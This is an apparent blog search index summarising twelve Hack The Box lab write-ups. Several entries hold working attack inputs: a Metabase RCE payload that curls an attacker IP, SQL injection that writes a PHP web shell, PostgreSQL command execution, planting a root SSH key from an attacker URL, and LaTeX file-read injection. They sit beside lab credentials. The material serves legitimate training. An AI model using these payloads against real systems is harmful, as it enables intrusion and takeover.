[ { "title": "Drive Report", "url": "/posts/HTBDrive/", "categories": "HTB", "tags": "HTB, Linux, Hard, Django, SQLite, Information Leakage", "date": "2023-11-04 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.235/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22 (ssh) SSH version: OpenSSH_8.2p1 Ubuntu-4ubuntu0.9 Current (02-10-23): OpenSSH 9.5 Codename: focal-security Version vulns: NIST Cybersecurity Credentials: None 80 (http) Location: http://drive.htb/ (Doodle Grive) Service: Upload, Edit, Share files with your friends and more… Server: Nginx/1.18.0 (Ubuntu) Stable: 1.24.0 Version vulns: Cybersecurity Headers: X-Frame-Options: clickjacking protection (&amp;lt;frame&amp;gt; or &amp;lt;iframe&amp;gt;) X-Content-Type-Options: avoid MIME type sniffing Referrer-Policy: control referer information Cross-Origin-Opener-Policy: prevents certain types of cross-origin attacks More headers info: OWASP Cookies: csrftoken=QgynsdW5Uci6mC721ifQAi6lXGcFIMtb Can prevent CRSF attacks Technologies: Bootstrap JQuery 3.0.0 Django (Web framework) Python Emails: customer-support@drive.htb support@drive.htb Users: James Mason (Security Engineer) Martin Cruz (Software Engineer) Tom Hands (Relationship manager) Cris Disel (Network Engineer) Routes: csrfmiddlewaretoken: Cross Site Request Forgery protection /login Username can’t be similar to the password Password can’t contain username marss:marss123 x marss:m4rss123 v/ Min password length: 8 characters /home (session [marss:mars1234]) Website users: admin jamesMason martinCruz tomHands crisDisel Vulnerability Assesment http://drive.htb (session) Endpoints enumeration /file_id/getFileDetail (500:not-found,401:unauthorized(exists),200:my-files) List unauthorized files: Information leakage: 79: martin server password 101: Database compression backup file Exploitation Low privilege user enumeration: User web hashes on database file (sqlite3) Hashcat cracking Hash type: Django (SHA-1) Gitea service (Internal port 3000): Credentials Reuse: Database backup feature commit (Information Leakage) Cracking more backup database hashes: A valid password to SSH access Post-exploitation Low privilege user enumeration: DoodleGrive self hosted cli tool (suid): Readable strings: username and password access Local binary analysis (ghidra) User input unique option: Sanitization code: SQLite3 rce method: load_extension() function Create malicious C code (simble reverse shell) Compile to library with gcc (on target machine) Input load sqlite function bypassing sanitization (char() function) “+load_extension(char(46,47,109))+” (.\\/m) * Export new PATH when receive the shell " }, { "title": "Manager Report", "url": "/posts/HTBManager/", "categories": "HTB", "tags": "HTB, Windows, Medium, Active Directory, MSSQL, ADCS", "date": "2023-11-01 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.236/32 (Windows (AD))TCP Nmap scan: 65,535 ports Open ports: 53/dns: manager.htb 80/http: Banner grabbing Server: Microsoft-IIS/10.0 Follow redirect: Service: Content Writing Services Technologies Boostrap JQuery[3.4.1] (OwlCarousel2/2.1.3) Javascript Cloudflare Headers None Cookies None Emails None Users None Directory Fuzzing file: content/dir_fuzzing Subdomains None 5985 (winrm) Banner grabbing: Server: Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) Valid creds: raven:R4v3nBe5tD3veloP3r!123 88, 464 (kerberos,kpasswd) User enumeration Kerbrute 135, 593 (msrpc): Endpoints (rpcdump_output) 139, 445 (SMB): Banner grabbing Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) User enumeration: Crackmapexec (rid-cycling brute) 389, 636, 3268, 3269 (ldap, ssl): file: ldap_enum_389 1433 (mssql): ms-sql-ntlm-info: 10.10.11.236:1433: Target_Name: MANAGER NetBIOS_Domain_Name: MANAGER NetBIOS_Computer_Name: DC01 DNS_Domain_Name: manager.htb DNS_Computer_Name: dc01.manager.htb DNS_Tree_Name: manager.htb Product_Version: 10.0.17763 ms-sql-info: 10.10.11.236:1433: Version: name: Microsoft SQL Server 2019 RTM number: 15.00.2000.00 Product: Microsoft SQL Server 2019 Service pack level: RTM Post-SP patches applied: false Vulnerability Assesment Equal username and password MSSQL bruteforce (crackmapexec) Valid Creds (operator:operator) MSSQL public funciton (xp_dirtree) Guest user: Exploitation List website backup file: Backup file analysis: Raven user creds: raven:R4v3nBe5tD3veloP3r!123 Valid winrm credentials Ryan Enumeration Certificate Authority service (certsvc.msc) &amp;amp;&amp;amp; AD Default Group: Certificate Service DCOM Access Certipy-ad _decompose solution: https://github.com/ly4k/Certipy/issues/108 Post-exploitation Vulnerable Certificate Authority Access Control Detection (certipy-ad) Exploitation The first command gives us the “Issue and Manage Certificates” authorization. The second command allow us to approve failed requests ourselves and roll out the corresponding certificates We can then issue the failed certificate request We can retrieve the issued certificate (administrator.pfx) Then we use certificate to login as Administrator Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), Solution: need to synchronise the host with the DC (sudo ntpdate manager.htb) References https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7 (certs escerarios + exploitation) https://posts.specterops.io/certified-pre-owned-d95910965cd2 (certs escerarios) https://www.prosec-networks.com/en/blog/adcs-privescaas/ (certs escerarios + exploitation + video) https://social.technet.microsoft.com/wiki/contents/articles/10942.ad-cs-security-guidance.aspx#Roles_and_activities (ca roles) " }, { "title": "Visual Report", "url": "/posts/HTBVisual/", "categories": "HTB", "tags": "HTB, Windows, Medium, Visual Studio, JuicyPotato", "date": "2023-10-28 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.234/32 (Windows)TCP Nmap scan: 65,535 ports Open ports: 80/http: Banner grabbing Server: Apache/2.4.56 (Win64) Follow redirect: Service: Visual Studio project compilation with Visual Requirements: Git Repo (.sln: file that maintains state information for a project in Visual Studio) Compatibility: .NET 6.0 (development platform that allows developers to build applications for cloud, web, desktop, mobile, gaming, IoT and A) y C# Return: executable / DLL files Technologies Bootstrap 5.1.3 (latest: v5.3.2) OpenSSL/1.1.1t (recently gone out of support)(latest: 3.1 series) PHP/8.1.17 (latest: 8.2) Headers None Cookies None Emails None Users None Directory Fuzzing file: content/dir_fuzzing Subdomains None Visual Studio projects and solutions Solution: a container Visual Studio uses to organize one or more related projects Proyect: contains all files that are compiled into an executable, library, or website (source code, icons, images, data files, compiler settings, etc) MSBuild: provides an XML schema for a project file that controls how the build platform processes and builds software Proyect file: XML document that contains all the information and instructions that MSBuild needs to build your project (C# project (.csproj), a Visual Basic project (.vbproj), or a database project (.dbproj)) Elements: Properties: name-value pairs that can be used to configure builds Items: inputs into the build system and typically represent files Tasks: units of executable code that MSBuild projects use to perform build operations (*) Exec task: run specified program or command More taks Targets: allow the build process to be factored into smaller units Prebuild (like Macros) Vulnerability Assesment MSbuild build events (C#): Visual Studio project: XML project file using “Target” element to process “Exec” task and execute commands Exploitation MSbuild event Process: On windows virtual Machine with Visual Studio create C# console app project Then add Target element to project file (example_name.csproj) with “Prebuild” event On Linux machine set-up local git repository (Gitea) using Docker-hub Transfer project from windows to linux (compress, etc) and initialize repository with git Pull repository to Gitea local server Send URL repository to Build web page (target) Wait a few seconds and the commad will have executed Post-exploitation Enox enumeration: web server folder permissions (uploads) Upload PHP shell to gain Local service user access (www-data on linux) nt authority-local service enum: Local Service Recovering the default privilege set of a service account Enabled SeImpersonatePrivilege https://github.com/itm4n/FullPowers SeImpersonatePrivilege GodPotatoe " }, { "title": "Clicker Report", "url": "/posts/HTBCLicker/", "categories": "HTB", "tags": "HTB, Linux, Medium, Python Scripting, CRLF, Command Injection, RCE", "date": "2023-10-25 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.232/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.4 OpenSSH 9.5/9.5p1 (2023-10-04) Codename: jammy codename.py CVEs Version: NIST Valid creds: None 80/http: Banner grabbing Server: Apache/2.4.52 (Ubuntu) Follow redirect: http://clicker.htb/ Services: The clicker game Technologies Bootstrap v4.3.1 PHP Headers None Cookies PHPSESSID=q790rl9f70uasg0i39ib7pgth4 (dynamic) Emails None Users None Directory Fuzzing file: content/dir_fuzzing register.php &amp;amp;&amp;amp; login.php: Acccount created: marss:marss Subdomains None Code analysis (clicker.htb) save_game.php db_utils.php authenticate.php index.php 111/rpcbind,2049/nfs: Data available to mount: /tmp/backups (Webpage content) clicker.htb Unknown 32791,43287,43905,46507,56687 Filtered ports: None Vulnerability Assesment CRLF (Carriage Return &amp;amp;&amp;amp; Line Feed) Bypass $_GET request input data Local testing (index.php) Valid injections: %0d%0a…,%0a…,…%0d%0a,…%0a Remote Code Execution Code injection on “nickname” variable (save_game.php) Exporting file (no extension check) Exploitation CRLF (Carriage Return &amp;amp;&amp;amp; Line Feed) Change User rol to Admin role Login again to load profile (authenticate.php) PHP code injection to RCE www-data enumeration SUID binary (Jack user) Code analysis With an invalid option we can insert any file to save in “sql_file” variable and then read it sql_file = create.sql /usr/bin/mysql -u clicker_db_user –password=’clicker_db_password’ clicker -v &amp;lt; /home/jack/queries/”sql_file” Read private id_rsa key (jack) Post-exploitation Jack enumeration SUID binary (monitor.sh) SETENV: set own enviroment variables /opt/monitor.sh Perl script ENVIRONMENT: (perlrun) PERL5OPT: environment variable allows specifying command-line options (-[CDIMTUWdmtw]) PERL5DB: load debug code Lateral movementProof of concept Remote Code execution clicker.htb " }, { "title": "Analytics Report", "url": "/posts/HTBAnalytics/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, CVE-2023-38646, CVE-2023-2640, CVE-2023-32629, GameOver(lay)", "date": "2023-10-20 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.233/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.4 OpenSSH 9.5/9.5p1 (2023-10-04) Codename: jammy codename.py CVEs Version: NIST Valid creds: metalytics:An4lytics_ds20223# 80/http: Banner grabbing Server: nginx/1.18.0 (Ubuntu) Follow redirect: http://analytical.htb/ Services: Storage Analytics Security Technologies Bootstrap Frame JQuery[3.0.0] Javascript libraries (Design) Headers None Cookies None Emails demo@analytical.com due@analytical.com Users Jonnhy Smith (Chief Data Officer) Alex Kirigo (Data Engineer) Daniel Walker (Data Analyst) Directory Fuzzing file: content/dir_fuzzing Subdomains http://data.analytical.htb Services: Login Page (Metabase) No default creds Technologies Javascript frameworks React, Emotion Lodash 4.17.21 Postgres Headers HttpOnly[metabase.DEVICE] UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy] X-Frame-Options[DENY] X-XSS-Protection[1; mode=block] Cookies metabase.DEVICE=05c90a08-5e21-4014-9d9c-40436eee1202;HttpOnly;Path=/;Expires=Mon, 19 Oct 2043 21:00:43 GMT;SameSite=Lax Emails None Users None Filtered ports: None Vulnerability Assesment CVE-2023-38646 (Unauthenticated metabase RCE) JDBC: Java API, which defines how a client may access a database zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(‘curl 10.10.15.12’)\\n$$–=x References https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ https://github.com/metabase/metabase https://www.metabase.com/learn/administration/metabase-api Exploitation CVE-2023-38646 metabase enumeration Enviroment variables Credentials: metalytics:An4lytics_ds20223# Post-exploitation Metalytics enumeration Kernel version Ubuntu, CVE-2023-2640 and CVE-2023-32629, aka GameOver(lay) Afected version: Ubuntu 22.04 LTS (Jammy Jellyfish) unshare -rm sh -c “command”: Execute command on privilege namespace to add SUID capabilities command: Create overlayfs with python binary (and some dependencies) in lowerdir Add cap_setuid+eip to python binary Run python command to set system uid to root and execute commands Lateral movementProof of concept CVE-2023-38646 (python script poc): https://github.com/E1P0TR0 " }, { "title": "Cozyhosting Report", "url": "/posts/HTBCozyhosting/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, RCE", "date": "2023-10-18 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.230/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.3 OpenSSH 9.5/9.5p1 (2023-10-04) Codename: jammy-security codename.py CVEs Version: NIST Valid creds: None 80/http: Banner grabbing Server: nginx/1.18.0 (Ubuntu) Follow redirect: http://cozyhosting.htb Technologies Bootstrap (v5.2.3) Lightbox Java Php Spring Boot Error Handling Headers UncommonHeaders[x-content-type-options] X-Frame-Options[DENY] X-XSS-Protection[0] Cookies JSESSIONID:6F6CD9A616392EDF4F057FC29B5FC88A (JavaServer Pages (JSP) or Servlet) Directory Fuzzing Spring wordlist /actuator Actuator mean: Monitoring our app, gathering metrics, and understanding traffic or the state of our database becomes trivial with this dependency /sessions Spring actuator enpoints file: content/dir_fuzzing Login access Kanderson JSESSIONID:704023E2CCDB8CC82763F23F2952F001 7777/cbt (Core-Based Tree): Network-layer multicast routing protocol [BFC93] Known Unauthorized Use on port 7777 [IANA] 8083/us-srv: Utilistor (Server), registered 2005-08 [IANA] Filtered ports: None Vulnerability Assesment Burpsuite SSH backend response Command Injection: ${IFS} bypass Remote code execution Exploitation App user access Web Java file analysis (cloud_hosting.jar) Spring boot folder structure application.properties: Properties file for configuring Spring Boot settings. Postgres credentials: Postgres access Credentials Offline cracking: kanderson:manchesterunited Post-exploitation Josh user Privileged binaries (root) /usr/bin/ssh * SSH options: ProxyCommand works by forwarding standard in and standard out (stdio) through an intermediate host Example: ssh -o ProxyCommand=”ssh -W %h:%p &amp;lt;jump server&amp;gt;” &amp;lt;remote server&amp;gt; Inyecting interactive Bash payload Lateral movementProof of concept Command Injection PoC: https://github.com/E1P0TR0 " }, { "title": "Intentions Report", "url": "/posts/HTBIntentions/", "categories": "HTB", "tags": "HTB, Linux, Hard, Python Scripting, SQLI, RCE", "date": "2023-09-30 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.220/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: jammy codename.py CVEs Version: NIST Valid creds: greg:Gr3g1sTh3B3stDev3l0per!1998! 80/http: Banner grabbing Server: nginx/1.18.0 (Ubuntu) Technologies Nginx 1.18.0 X-XSS-Protection: Stops pages from loading when they detect reflected cross-site scripting (XSS) attacks JavaScript Frameworks: VueJS/2.7.14 (latest: 3.3.4): No direct vulnerabilities Libraries: Axios: Not version Core-js/3.27.1 (latest: 3.32.2): No direct vulnerabilities Lodash/4.17.21 (latest: 4.17.21): No direct vulnerabilities Cookies XSRF-TOKEN: Cross-Site Request Forgery protection intentions_session http://10.10.11.220 (Image Gallery): Web page interface (Login page) Basic web scrapping: init_url_scrapping.txt Registration enabled Your Profile Upate feature and Yor feed genres = “ ‘ “ -&amp;gt; 500 Internal server error (MySQL?) This is a new feature to curate your personal feed! Input your favorite genres separated by commas. Example: animals,food Multiple values in a WHERE clause SELECT * FROM images WHERE genres IN (‘animals’,’food’); Directory Fuzzing /js/admin.js “This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!” “I’ve assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps” Vulnerability Assesment Multiple values in a WHERE clause + bypass SPACES: input: ‘)/**/or/**/1=1# Web admin users credentials (not crackeable) steve:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa greg:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m API v2 Login: Edit image system path: /var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg Google searching: “PHP Imagick vulnerabilities” MSL stands for Magick Scripting Language. It’s a built-in ImageMagick language that facilitates the reading of images, performance of image processing tasks, and writing of results back to the filesystem. Exploitation Imagick php library (Magic Scripting Language): https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/ Create image with embed php code Create Magic Scripting Language file to read local image and write embeded php code to php file. Use of “vid” and “msl” schema Call php file to get remote code execution Post-exploitation (www-data) enumeration: Git folder Greg credentials: greg:Gr3g1sTh3B3stDev3l0per!1998! Lateral movement (greg) enumeration: DMCA scanner binary (copyright) * With the flag “-l” we can obtain md5 hash of first x bytes of data and brute force any system file (root access) Proof of concept Database dump (python script) Remote code execution (Magic Scripting Language) File bruteforce (md5 challenge) Repository: https://github.com/E1P0TR0" }, { "title": "Gofer Report", "url": "/posts/HTBGofer/", "categories": "HTB", "tags": "HTB, Linux, Hard, SSRF, Path Hijacking, Phishing, Binary Analysis, Macros", "date": "2023-09-23 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.225/32 (Linux)TCP Nmap scan: 65,535 ports Filtered ports: 25/smtp (filtered) Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.4p1 Debian-5+deb11u1 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: bullseye codename.py CVEs Version: https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;amp;cves=on&amp;amp;cpe_version=cpe:/a:openbsd:openssh:8.4p1 Valid creds: tbuckley:ooP4dietie3o_hquaeti (CTO) 80/http: Banner grabbing Redirection http://gofer.htb/ Server version: Apache/2.4.56 (Debian) Latest: 2.4.57 User enumeration Jeff Davis (Chief Executive Officer) Jocelyn Hudson (Product Manager) Tom Buckley (CTO) Amanda Blake (Accountant) http://proxy.gofer.htb (401 unauthorized) HTTP Methods/Verbs fuzzing: POST /index.php -&amp;gt; Missing URL parameter ! Server Side Request Forgery Blacklist enabled 139,445/smb: Version: Samba 4.13.13-Debian Banner grabbing Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False) User enumeration jdavis@gofer.htb tbuckley@gofer.htb RID cycling SMB default session (shares) /backup/mail New subdomain: http://proxy.gofer.htb “important documents will only be sent internally, by mail” “use .odt format” “web proxy will be more secure” Vulnerability Assesment SSRF (http://proxy.gofer.htb/index.php?url=) Gopher protocol: communication protocol designed for distributing, searching, and retrieving documents in Internet Protocol networks SMTP syntax: gopher://server_ip:server_port/_QUERY… Payload generator (send mail) Exploitation OpenOffice document file (.odt): file format for word processing documents Basic Write office macro to execute commands (libreoffice) Tools -&amp;gt; Macros -&amp;gt; Organize macros -&amp;gt; basic -&amp;gt; new: Assign -&amp;gt; events -&amp;gt; Open document Share file and wait for jhudson to open the file Post-exploitation Tbuckley enumeration: [tbuckley:ooP4dietie3o_hquaeti] /usr/local/bin/notes (ELF 64-bit LSB pie executable) Ghidra analysis Rewrite role to admin Concept: “Occasionally, free can actually return memory to the operating system and make the process smaller. Usually, all it can do is allow a later call to malloc to reuse the space. In the meantime, the space remains in your program as part of a free-list used internally by malloc. https://www.gnu.org/software/libc/manual/html_node/Freeing-after-Malloc.html With admin role, abuse path hijacking Lateral movement Jhudson Enumeration Proxy authentication (.htpasswd) Processes (pspy) Proof of concept SSRF (gopher protocol) " }, { "title": "Snoopy Report", "url": "/posts/HTBSnoopy/", "categories": "HTB", "tags": "HTB, Linux, Hard, LFI, CVE-2023-20052, DNS, Bash Scripting, Python Scripting", "date": "2023-09-20 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.212/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: jammy codename.py CVEs Version: https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;amp;cves=on&amp;amp;cpe_version=cpe:/a:openbsd:openssh:8.9p1 Valid creds: cbrown:sn00pedcr3dential!!! 53/dns: Zone transfer Nameservers: ns1.snoopy.htb (10.0.50.10) ns2.snoopy.htb (10.0.51.10) Subdomains: mattermost.snoopy.htb (172.18.0.3) mm.snoopy.htb (127.0.0.1) postgres.snoopy.htb (172.18.0.2) provisions.snoopy.htb (172.18.0.4) www.snoopy.htb (127.0.0.1) * 80/http: Banner grabbing Server: nginx/1.18.0 (Ubuntu) Url scrapping: Domains: snoopy.htb, mail.snoopy.htb Web server: http://10.10.11.212 SnoopySec is a leading provider of DevSecOps tooling for web-based businesses Release package: http://snoopy.htb/download PDF announcement: http://snoopy.htb/download?file=announcement.pdf (SnoopySec’s DevSecOps tooling or to schedule a demo about: www.snoopy.htb) Contact info: Attention: As we migrate DNS records to our new domain please be advised that our mailserver ‘mail.snoopy.htb’ is currently offline. SnoopySec PR (pr@snoopy.htb) Form test User enumeration: Charles Schultz (Chief Executive Officer) (cschultz@snoopy.htb) Sally Brown (Product Manger) (sbrown@snoopy.htb) Harold Angel (CTO) (hangel@snoopy.htb) Lucy Van Pelt (Accountant) (lpelt@snoopy.htb) http://mm.snoopy.htb (127.0.0.1) Mattermost version: 7.9.0 (X-Version-Id: 7.9.0.7.9.0.c7ce78937711597df2938cf8dd2034c7.false) NO valid credentials Password reset (need email) Vulnerability Assesment http://snoopy.htb/download?file= (vulnerable to LFI) ![](basic_lfi.png) Insecure DNS update allow-update: allow-update defines an address_match_list of hosts that are allowed to submit dynamic updates for master zones We can update mail server records to enable the password reset service on “mattermost” (local) Password reset send Remove “=3D” characters to valid token User: cschultz@snoopy.htb Password: password123$! Cbrown: “Hey everyone, I just created a new channel dedicated to submitting requests for new server provisions as we start to roll out our new DevSecOps tool” /server_provision command Exploitation SSH-MITM (cbrown access) [cbrown:sn00pedcr3dential!!!] Cbrown enumeration Sudo binary like sbrown CVE-2023-23946 Post-exploitation Sbrrown enumeration Sudo binary like root CVE-2023-20052 DMG generator github https://github.com/nokn0wthing/CVE-2023-20052 Lateral movementProof of concept http://snoopy.htb/download?file= (vulnerable to LFI) DNS record update Password reset Script repository: https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Snoopy" }, { "title": "Zipping Report", "url": "/posts/HTBZipping/", "categories": "HTB", "tags": "HTB, Linux, Medium, SQLI, RCE, LFI, Bash Scripting, Python Scripting", "date": "2023-09-14 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.229/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_9.0p1 Ubuntu-1ubuntu7.3 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: kinetic codename.py CVEs Version: https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;amp;cves=on&amp;amp;cpe_version=cpe:/a:openbsd:openssh:9.0p1 80/http: Banner grabbing Server: Apache/2.4.54 (Ubuntu) Firefox Technologies Programming Languages: PHP JavaScript libraries: Jquery 3.4.1 Basic url scrapping http://10.10.11.229/upload.php Description: The application will only accept zip files, inside them there must be a pdf file containing your curriculum. http://10.10.11.229/shop Description: Zipping watching store (Basic LFI vulnerable [page]) [only .php files] Vulnerability Assesment http://10.10.11.229/upload.php (ZIP automatically decompressed upload) https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload Steps: ln -rs /etc/passwd reader.pdf zip –symlinks reader.zip reader.pdf Code analisys (/shop/cart.php) preg_match: To bypass this check you could send the value with new-lines urlencoded (%0A) https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-. (/shop/index.php) We can include any .php file in “page” parameter Create phpinfo file in a directory with permissions and read it Payload: ‘;select+’&amp;lt;?php+phpinfo(); ?&amp;gt;’+into+outfile+’/var/lib/mysql/phpinfo.php’;#1 Exploitation rektsu RCE Payload: %0a’;select ‘&amp;lt;?php system($_GET[“cmd”]); ?&amp;gt;’ into outfile ‘/var/lib/mysql/rce_poc.php’;#1 Post-exploitation Rekztu user Sudo binary without password (/usr/bin/stock) Shared Libraries https://tbhaxor.com/understanding-concept-of-shared-libraries/ Lateral movementProof of concept http://10.10.11.229/upload.php (ZIP automatically decompressed upload) Bash script (zip_reader.sh) http://10.10.11.229/shop/cart.php &amp;amp; http://10.10.11.229/shop/index.php?page (SQLI and PHP include) Python script Repository scripts https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Zipping" }, { "title": "Jupiter Report", "url": "/posts/HTBJupiter/", "categories": "HTB", "tags": "HTB, Linux, Medium, PostgreSQL, Python Scripting", "date": "2023-09-09 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.216/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: jammy codename.py CVEs Version: https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;amp;cves=on&amp;amp;cpe_version=cpe:/a:openbsd:openssh:8.9p1 Valid credentials: None 80/http: Banner grabbing Resolving to Local DNS server: http://jupiter.htb Firefox Technologies HttpServer: Nginx/1.18.0 (Ubuntu/Linux) Version vulns: https://www.cybersecurity-help.cz/vdb/nginx/nginx/1.18.0/ Stable version: 1.24.0 https://nginx.org/en/download.html JQuery/3.3.1 Version vulns: https://security.snyk.io/package/npm/jquery/3.3.1 Stable version: 3.7.0 (May 11, 2023) Url Scrapping Subdomain enumeration New subdomain: http://kiosk.jupiter.htb Firefox (Moons and some tables) Technologies Grafana v9.5.2 (open source analytics &amp;amp; monitoring solution for every database) Version vulns: None Stable version: 10.1.1 https://grafana.com/grafana/download API: https://grafana.com/docs/grafana/latest/developers/http_api/ Go 1.20.4 Angular 1.8.3 PostgreSQL Vulnerability Assesment Burpsuite proxy (home) Exposed Grafana API query (postgres): Version: select version() [PostgreSQL 14.8] Credentials: grafana_viewer:SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY= Current user: grafana_viewer Permisions query: SELECT current_setting(‘is_superuser’); = on When can read wiles or execute commands Postgres roles: https://www.postgresql.org/docs/current/role-attributes.html Postgres pentesting: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-with-postgresql-languages Exploitation PostgreSQLi DROP TABLE IF EXISTS cmd_rce; CREATE TABLE cmd_rce(cmd_out text); COPY cmd_rce FROM PROGRAM ‘id’; SELECT * FROM cmd_rce; Post-exploitation System User Shell (postgress) Enumeration Process (pspy.sh) Juno user cron job Shadow simulation (/home/juno/shadow-simulation.sh) Shadow directly executes real, unmodified application binaries natively in Linux as standard OS processes (using vfork() and execvpe()): we call these processes executed by Shadow managed processes. Example: (Basic File Transfer) We have write access to network-simulation.yml (-rw-rw-rw- 1 juno juno 815 Mar 7 2023 /dev/shm/network-simulation.yml) Juno user Enumeration Process (jovian /usr/bin/python3 /usr/local/bin/jupyter-notebook –no-browser /opt/solar-flares/flares.ipynb) Juno group: science Group permissions: drwxrwx— 4 jovian science 4096 May 4 18:59 /opt/solar-flares Jupyter Notebook is running on default port 8888 Access with Local Port Forwarding in SSH Access token Enabled Searchings recent logs (Token leaked) Jovian JUpyter Notebookacces (Free Remote code execution) Jovian user Enumeration Binary execution policy ((ALL) NOPASSWD: /usr/local/bin/sattrack) Sattrack: Satellite tracking software for linux Documentation options tlesources: A array of URLs to curl get into tleroot tleroot: Location to get and load TLE files tlefile: TLE filename to load from tleroot Lateral movement Pivot to Juno user (network-simulation.yml) Add our id_rsa.pub to juno authorized keys nad log with ssh (Persistence) Pivot user Jovian (Jupyter notebook access) Pivot to Root Request our id_rsa.pub to root authorized_keys file tlesources: http://10.10.15.5/id_rsa.pub tleroot: /root/.ssh tlefile: authorized_keys Proof of concept Postgres RCE script https://github.com/E1P0TR0 Juno RCE .yaml " }, { "title": "Topology Report", "url": "/posts/HTBTopology/", "categories": "HTB", "tags": "HTB, Linux, Easy, LaTeXi", "date": "2023-09-05 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.217/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.2p1 Ubuntu-4ubuntu0.7 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: focal codename.py CVEs Version: https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;amp;cves=on&amp;amp;cpe_version=cpe:/a:openbsd:openssh:8.2p1 Valid credentials: (vdaisley:calculus20) 80/http: Banner grabbing Resolving to Local DNS server: http://topology,htb Firefox Technologies HttpServer: Apache/2.4.41 (Ubuntu/Linux) Email: lklein@topology.htb (Posible user) Posible users Professor Lilian Klein, PhD (Head of Topology Group) Vajramani Daisley, PhD (Post-doctoral researcher, software developer) Derek Abrahams, BEng (Master’s student, sysadmin) Url Scrapping New subdomain: http://latex.topology.htb/equation.php Create .PNGs of LaTeX equations in your browser Programming languages: PHP Software: Latex (Posible Injection attack) TeX category codes (Latex Math “$”) Latext injections: https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection Subdomain enumeration http://dev.topology.htb (401) Basic HTTP Authentication https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication http://stats.topology.htb (200) Vulnerability Assesment Latext In/Out math Mode Input: $ (Out math mode error) Input: $normalmode$\\frac{x+5}{y-3} (not errors) http://dev.topology.htb (/var/www/dev) Read .htpasswd (file to password-protect a directory on an Apache server) Exploitation Crack Hash (vdaisley:calculus20) Vajramani Daisley, PhD (Post-doctoral researcher, software developer) Reuse Credentials (SSH access) Post-exploitation Daisley Enumeration Listing system process (basic pspy.sh) Gnuplot: (command-line and GUI program) Create .plt file with reverse shell, move file to /opt/gnuplot directory (write access), wait one minute aprox and gain access Lateral movementProof of concept Latex injection (Read files) Input: $\\lstinputlisting{/etc/issue}$ (Out math mode and in math mode again to bypass errors) Gnuplot 